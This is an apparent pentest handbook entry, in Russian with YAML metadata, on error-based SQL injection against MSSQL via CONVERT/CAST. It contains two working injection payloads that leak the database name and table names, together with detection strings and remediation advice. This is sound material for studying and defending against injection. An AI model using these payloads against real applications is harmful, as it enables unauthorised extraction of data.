---
id: sqli-mssql-error-based-convert
title: "MSSQL: error-based через CONVERT/CAST"
type: sqli
target: mssql
category: web
difficulty: intermediate
bypass: none
tags: [sqli, mssql, error-based]
tested_on: ["SQL Server 2019"]
success_rate: 0.8
risk: medium
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# MSSQL: error-based через CONVERT/CAST

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' AND 1=CONVERT(int,(SELECT DB_NAME())) --
```

## Explanation

Приведение строки к `int` вызывает ошибку `Conversion failed when converting the varchar
value 'appdb' to data type int`, в текст которой попадает результат подзапроса.
Работает там, где `UNION` неудобен (неизвестно число колонок) и где ошибки возвращаются клиенту.

## Detection

Ищите в ответах `Conversion failed`, `Incorrect syntax near`, `Unclosed quotation mark`.
Наличие таких сообщений в production — самостоятельная находка.

## Remediation

- Единая обработка исключений: клиенту — общий текст, детали — в лог.
- Параметризация.
- WAF-сигнатуры на `CONVERT(`, `CAST(` в параметрах запроса.

## Variants

```
' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS int) --
```
